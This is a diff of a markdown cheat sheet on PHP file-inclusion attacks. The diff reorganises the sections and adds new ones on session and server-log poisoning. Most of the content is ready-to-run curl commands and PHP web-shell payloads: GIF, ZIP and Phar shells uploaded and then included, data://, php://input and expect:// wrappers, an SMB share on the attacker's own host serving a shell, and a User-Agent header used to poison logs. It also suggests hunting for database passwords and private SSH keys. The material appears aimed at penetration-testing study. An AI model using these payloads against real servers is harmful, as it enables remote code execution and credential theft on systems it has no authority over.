@@ -1,12 +1,6 @@
 ### Content
 * [Overview](#overview)
 * [Local file inclusion](#local-file-inclusion) (LFI)
-	* Path Traversal
-	* Second-Order Attacks
-	* LFI and File Uploads
-		* GIF Image Upload
-		* ZIP Upload
-		* Phar Upload
 * [Bypasses Techniques](#bypasses-techniques)
 	* Non-Recursive Path Traversal Filters
 	* Encoding
@@ -16,12 +10,23 @@
 * [PHP Filters](#php-filters)
 	* [Scenarios](#scenarios)
 		* Reading PHP files with convert filter
-* From LFI to RCE
-	* PHP Wrappers
+* [From LCI to RCE](#from-lci-to-rce)
+	* [PHP wrappers](#php-wrappers)
 		* Data / Input / Expect
 	* [Remote File Inclusion](#remote-file-inclusion) (RFI)
 		* Python / FTP / SMB
+	* [File Uploads](#file-uploads)
+		* GIF Image Upload
+		* ZIP Upload
+		* Phar Upload
+	* [Log Poisoning](#log-poisoning)
+		* [PHP Session Poisoning](#php-session-poisoning)
+		* [Server Log Poisoning](#server-log-poisoning)
 * [Read, Write and Execute Functions](#read-write-and-execute-functions)
+
+> [!Important]
+> [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
+
 ---
 ## Overview
 - **Types of File Inclusion**:
@@ -49,48 +54,6 @@ If we were not sure of the directory the web application is in, we can add `../`
 - **Second-Order Attacks**
 	- If a web application allow the user to download his avatar through `/profile/$username/avatar.png`, If we crafted a malicious username `../../../etc/passwd`.
 	- If the web application didn't sanitize or filter our username, It will be possible to pull another local file from the system rather the user avatar.
-- LFI and File Uploads
-	- GIF Image Upload
-		- Crafting Malicious Image
-			``` bash
-			echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
-			```
-		- We can find the file path through the HTML code of the site or through the URL 
-			``` HTML
-			<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
-			```
-		- Include the uploaded file in the LFI vulnerable function
-			``` bash
-			curl "http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id"
-			```
-	- Zip Upload (zlib:// bzip2:// zip:// wrappers to execute PHP code. This wrapper isn't enabled by default) 
-		- Crafting Malicious ZIP
-			``` bash
-			echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
-			```
-		- Include the uploaded file in the LFI vulnerable function
-			``` bash
-			curl "http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id"
-			```
-	- Phar Upload
-		- Create `shell.php`
-			``` PHP
-			<?php
-			$phar = new Phar('shell.phar');
-			$phar->startBuffering();
-			$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
-			$phar->setStub('<?php __HALT_COMPILER(); ?>');
-			
-			$phar->stopBuffering();
-			```
-		- compile it into a `phar` file and rename it to `shell.jpg`
-			``` bash
-			php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
-			```
-		- Include the uploaded file in the LFI vulnerable function
-			``` bash
-			curl "http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id"
-			```
 ---
 > [!TIP]
 > Don't forget to try to combine many techniques together because Some web applications may apply many filters together. 
@@ -128,9 +91,8 @@ If we were not sure of the directory the web application is in, we can add `../`
 ---
 ## PHP Filters
 - [PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php) allow us to access different I/O streams at the application level, like standard input/output, file descriptors, and memory streams.
-- There are 4 types of filters: [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php).
-- To use PHP wrapper streams, we can use the `php://` scheme in our string and access the PHP filter wrapper with `php://filter/`.
-- The main parameters for filter wrapper are `resource` and `read`.
+- 4 types of filters: [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php).
+- Main parameters for filter wrapper are `resource` and `read`.
 	- `resource` To specify the stream we would like to apply our filter on (e.g. local file).
 	- `read` To apply different filters on the input resource.
 	- The important filter for FI is `convert.base64-encode` filter, under [Conversion Filters](https://www.php.net/manual/en/filters.convert.php).
@@ -152,40 +114,40 @@ If we were not sure of the directory the web application is in, we can add `../`
 			```
 ---
 ## From LCI to RCE
-> [!TIP]
+> [!Note]
+> - `/etc/php/X.Y/apache2/php.ini` for Apache (`X.Y` is the PHP version installed).
+> - `/etc/php/X.Y/fpm/php.ini` for Nginx.
 > - Search for DB password in `config.php` and check for password reuse.
 > - Check `.ssh` directory on each user home directory for their private keys `id_rsa`.
-- **PHP wrappers**:
-	- [Data](https://www.php.net/manual/en/wrappers.data.php)
-		- Check PHP configurations to see if (`allow_url_include`) setting is enabled.
-			- `/etc/php/X.Y/apache2/php.ini` for Apache (`X.Y` is the PHP version installed) 
-			- `/etc/php/X.Y/fpm/php.ini` for Nginx
-				``` bash
-				curl "http://URL/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
-				# Then decode the output
-				echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
-				```
-			- Encode our payload then send it with data wrapper `data://text/plain;base64`
-				``` bash
-				$ echo '<?php system($_GET["cmd"]); ?>' | base64
-				PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
-				$ curl -s 'http://URL/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep id
-				```
-	- [Input](https://www.php.net/manual/en/wrappers.php.php)
-		- Check PHP configurations to see if (`allow_url_include`) setting is enabled.
-		- Send the payload as a POST parameter, so the vulnerable parameter must accept POST request.
-			``` bash
-			curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://URL/index.php?language=php://input&cmd=id"
-			# If the vulnerable function doesn't accept GET parameters, hardcode the command directly in the payload
-			curl -s -X POST --data '<?php system("id"); ?>' "http://URL/index.php?language=php://input"
-			```
-	- [Expect](https://www.php.net/manual/en/wrappers.expect.php)
-		- Expect wrapper is an external wrapper so it has to be installed and enabled manually.
-		- Check PHP configurations like above but `grep expect`, we would get `extension=expect` as result if it's there.
-		- Use expect module to gain RCE
-			``` bash
-			curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
-			```
+### PHP wrappers:
+- [Data](https://www.php.net/manual/en/wrappers.data.php)
+	- Check PHP configurations to see if (`allow_url_include`) setting is enabled.
+		``` bash
+		curl "http://URL/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
+		# Then decode the output
+		echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
+		```
+	- Encode our payload then send it with data wrapper `data://text/plain;base64`
+		``` bash
+		$ echo '<?php system($_GET["cmd"]); ?>' | base64
+		PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
+		$ curl -s 'http://URL/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep id
+		```
+- [Input](https://www.php.net/manual/en/wrappers.php.php)
+	- Check PHP configurations to see if (`allow_url_include`) setting is enabled.
+	- Send the payload as a POST parameter, so the vulnerable parameter must accept POST request.
+		``` bash
+		curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://URL/index.php?language=php://input&cmd=id"
+		# If the vulnerable function doesn't accept GET parameters, hardcode the command directly in the payload
+		curl -s -X POST --data '<?php system("id"); ?>' "http://URL/index.php?language=php://input"
+		```
+- [Expect](https://www.php.net/manual/en/wrappers.expect.php)
+	- Expect wrapper is an external wrapper so it has to be installed and enabled manually.
+	- Check PHP configurations like above but `grep expect`, we would get `extension=expect` as result if it's there.
+	- Use expect module to gain RCE
+		``` bash
+		curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
+		```
 ### Remote File Inclusion:
 - Any RFI vulnerability is also an LFI vulnerability, but an LFI may not necessarily be an RFI. Check [Read, Write and Execute Functions](#read-write-and-execute-functions)
 - How to verify a RFI:
@@ -217,8 +179,103 @@ If we were not sure of the directory the web application is in, we can add `../`
 			``` bash
 			impacket-smbserver -smb2support share $(pwd)
 			# Visist the URL on the browser:
-			"http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami"
+			curl "http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami"
 			```
+### File Uploads
+- GIF Image Upload
+	- Craft the malicious Image and upload it.
+		``` bash
+		echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+		```
+	- We can find the file path through the HTML code of the site or through the URL 
+		``` HTML
+		<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
+		```
+	- Include the uploaded file in the LFI vulnerable function
+		``` bash
+		curl "http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id"
+		```
+- Zip Upload (zlib:// bzip2:// zip:// wrappers to execute PHP code. This wrapper isn't enabled by default) 
+	- Craft the malicious ZIP and upload it.
+		``` bash
+		echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+		```
+	- Include the uploaded file in the LFI vulnerable function
+		``` bash
+		curl "http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id"
+		```
+- Phar Upload
+	- Create `shell.php`
+		``` PHP
+		<?php
+		$phar = new Phar('shell.phar');
+		$phar->startBuffering();
+		$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+		$phar->setStub('<?php __HALT_COMPILER(); ?>');
+		
+		$phar->stopBuffering();
+		```
+	- compile it into a `phar` file and rename it to `shell.jpg` and upload it.
+		``` bash
+		php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+		```
+	- Include the uploaded file in the LFI vulnerable function
+		``` bash
+		curl "http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id"
+		```
+### Log Poisoning
+Writing PHP code in a field we control that gets logged into a log file, and then include that log file to execute the PHP code.
+For this attack to work, We should have read privileges over the logged files and the vulnerable function has execute privileges.
+#### PHP Session Poisoning
+- Most PHP web apps utilize `PHPSESSID` cookies to save user data on the back-end
+	- `/var/lib/php/sessions/sess_<PHPSESSID_cookie_value>`  on Linux
+	- `C:\Windows\Temp\sessions\sess_<PHPSESSID_cookie_value>` on Windows
+
+**Scenario** If we have an infected web application with LFI on the language parameter:
+1. Include the session file through the LFI vulnerability and view its contents:
+	``` bash
+	$ curl "http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd"
+	[SNIP]......page|s:6:"en.php";preference|s:7:"English";.......
+	# page value is under our control, as we can control it through the ?language= parameter.
+	```
+2. Manipulate the controllable parameter to become a PHP web shell.
+	``` bash
+	$ curl "http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E"
+	```
+3. Include the session file and use the `&cmd=id` to execute a commands
+	``` bash
+	$ curl "http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id"
+	......page|s:30:"uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)";preference|s:7:"Spanish";.....[SNIP]
+	```
+
+> [!Note] To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten after every inclusion.
+#### Server Log Poisoning
+- `access.log` and `error.log`.
+	- `Nginx` readable by low privileged users by default. 
+		- `/var/log/nginx/` on Linux.
+		- `C:\nginx\log\` on Windows.
+	- `Apache` readable by users with high privileges, **Older and misconfigured are not**.
+		- `/var/log/apache2/` on Linux.
+		- `C:\xampp\apache\logs\` on Windows.
+- If they are in different location, we may use [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations.
+> Poisoning `User-Agent` header on http requests.
+- `User-Agent` header can be controlled by editing requests.
+	- Shown on:
+		- `access.log`
+		- `/proc/self/environ`
+		- `/proc/self/fd/N` files (where N is a PID usually between 0-50)
+	- If we can include a file from the 3 above, Poison the `User-Agent` header then include the readable: 
+		``` bash
+		curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
+		curl "http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log?cmd=id" | grep uid
+		[SNIP]..."uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)"
+		```
+- If we have read permissions to read various system services logs with LFI such `ssh`, `ftp`, `mail services`:
+	- Try log into them and set the username to PHP code, and upon including their logs, the PHP code would execute.
+		- `/var/log/sshd.log` 
+		- `/var/log/vsftpd.log`
+	- We can send an email containing PHP code, and upon its log inclusion, the PHP code would execute.
+		- `/var/log/mail`
 ---
 ## Read, Write and Execute Functions
 
